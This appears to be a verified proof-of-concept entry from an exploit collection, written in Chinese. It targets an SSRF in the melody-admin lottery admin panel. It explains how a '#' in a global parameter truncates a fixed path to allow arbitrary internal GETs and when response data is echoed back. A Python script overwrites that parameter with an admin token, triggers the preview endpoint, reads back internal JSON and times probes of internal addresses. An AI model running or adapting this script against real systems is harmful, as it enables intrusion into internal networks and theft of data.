# melody-admin 彩种模板同步 SSRF：回显只认 data 数组信封；60s 时延不能当内网 DROP 判据

- **code**: melody-admin-彩种模板同步-ssrf-回显只认-data-数组信封-60s-时延不能当内网-drop-判据
- **kind**: poc
- **category**: ssrf
- **component**: melody-admin / renren 风格 Spring Boot 管理端
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: example.com（awt1）：common_data_site_domain 设为 http://203.0.113.77:19188# 触发 /lottery/lotteryTemplate/preview，远端返回 {"msg":"success","code":0,"data":[{...}]} 时 preview 回 code0 且 templateLotteries 原样回显；同一远端返回裸数组 [..] 时一律 code500。时延对照：127.0.0.1:1=0.24~0.26s、http://203.0.113.81:1273/=0.35s（200 可达）、首次 NXDOMAIN=0.91/0.96s、10.255.255.1=60.57s、公网已解析但丢包的 203.0.113.123:80=60.49s。
- **path**: pocs/melody-admin-彩种模板同步-ssrf-回显只认-data-数组信封-60s-时延不能当内网-drop-判据/melody_ssrf_readback.py
- **tags**: melody-admin,ssrf,time-based,oracle,readback,hutool,内网探测
- **created_at**: 2026-10-20T10:05:30.143Z

## 描述

DB 驱动的任意路径 GET + JSON 读回通道（common_data_site_domain 值尾部加 # 可截断代码拼接的固定后缀 /melody-admin/lottery/lotteryTemplate/source，实现任意路径）。关键判据修正：回显要求远端返回 melody 标准信封且 data 为数组（{"msg":"success","code":0,"data":[...]}）；裸顶层数组、data 为对象/字符串、非 JSON 一律 code500，data 缺失时返回 code0+空数组（易误判）。时延三态（DROP≈60s / 拒连≈0.25s / 可达≈0.5s）不可靠：可达 HTTP-200 实测仅 0.35s 与拒连同档，且公网已解析但对出口丢包的域名/裸 IP 也会 60s（本靶 zh-hwy-ip.ag99.com=203.0.113.123、zh-hwy-ip.yc05.com=203.0.113.65 均伪造出 60s）。因此用 60s 判定『内网可解析』前必须先 DoH 排除公网泛解析/真实 A 记录。适用场景：内网命名可达性盲探、任意内网 JSON 接口读取（需匿名 GET 且 data 为数组）。

## 正文

```
# -*- coding: utf-8 -*-
"""melody-admin 彩种模板同步 SSRF 读写通道（test1-admin/awt1 实测）

前置：管理员 token（POST /melody-admin/sys/login，captcha.jpg + ddddocr）；
      sysParamId=7123（sys_param_code=common_data_site_domain），经 /sys/sysparam/update 改写；
      改前 getByCode 读原值，测完立即恢复（该参数是全局单值，多人共用）。
用法：
  setp('http://<host>:<port>#')            # # 截断固定后缀 → 请求 GET /
  setp('http://<host>:<port>/any/path#')   # 任意路径
  setp('http://<host>')                    # 不截断 → GET /melody-admin/lottery/lotteryTemplate/source
  POST /melody-admin/lottery/lotteryTemplate/preview {} （带 token）
判读：
  code0 + data.templateLotteries=[...]  ⇒ 远端返回了 {"msg":"success","code":0,"data":[<array>]}（读回成功）
  code0 + templateLotteries=[]          ⇒ data 缺失/空（不是读回成功，勿误判）
  code500                               ⇒ 非信封/非 JSON/连接错误
时延：60s=TCP connect 超时（过滤/丢包），但公网已解析且丢包的目标同样 60s → 先用 DoH 排除；
      可达 HTTP-200 与拒连均 0.25~0.35s，无法区分；用哨兵回读确认参数未被他人覆盖。
"""
import requests, urllib3, json, uuid, time
urllib3.disable_warnings()
BASE='https://example.com/melody-admin'
s=requests.Session(); s.trust_env=False; s.verify=False
s.headers.update({'User-Agent':'Mozilla/5.0 ... Chrome/203.0.113.52 Safari/537.36',
                  'Origin':'https://example.com','Referer':BASE+'/',
                  'Content-Type':'application/json;charset=UTF-8'})
ORIG='http://gdl74tfh01a.shya1688.com'; PID=7123

def setp(tok,v):
    r=s.post(BASE+'/sys/sysparam/update',headers={'token':tok},
             data=json.dumps({'sysParamId':PID,'sysParamValue':v}),timeout=30)
    return r.json().get('code')==0
def getp(tok):
    r=s.get(BASE+'/sys/sysparam/getByCode/common_data_site_domain',headers={'token':tok},timeout=20)
    return r.json()['data']['sysParamValue']
def preview(tok,tm=95):
    st=time.time()
    r=s.post(BASE+'/lottery/lotteryTemplate/preview',headers={'token':tok},data='{}',timeout=(10,tm))
    return round(time.time()-st,2), r.json()

def probe(tok,value,restore=True):
    assert setp(tok,value), 'setp failed'
    assert getp(tok)==value, 'sentinel mismatch (another worker overwrote)'
    dt,j=preview(tok)
    d=j.get('data') if isinstance(j,dict) else None
    out={'value':value,'dt':dt,'code':j.get('code'),'msg':j.get('msg'),
         'templateLotteries':(d or {}).get('templateLotteries') if isinstance(d,dict) else None}
    if restore: setp(tok,ORIG); assert getp(tok)==ORIG
    return out

# 用法示例：
# tok = login(...)
# print(probe(tok,'http://203.0.113.77:19188#'))        # 正向对照：远端返回 {code:0,data:[..]}
# print(probe(tok,'http://zh-hwy-ip.ag49.com'))           # 目标：source 路径，恒 500
# print(probe(tok,'http://127.0.0.1:1/#'))                # 拒连对照 0.25s
# print(probe(tok,'http://10.255.255.1/#'))               # 丢包对照 60s

```
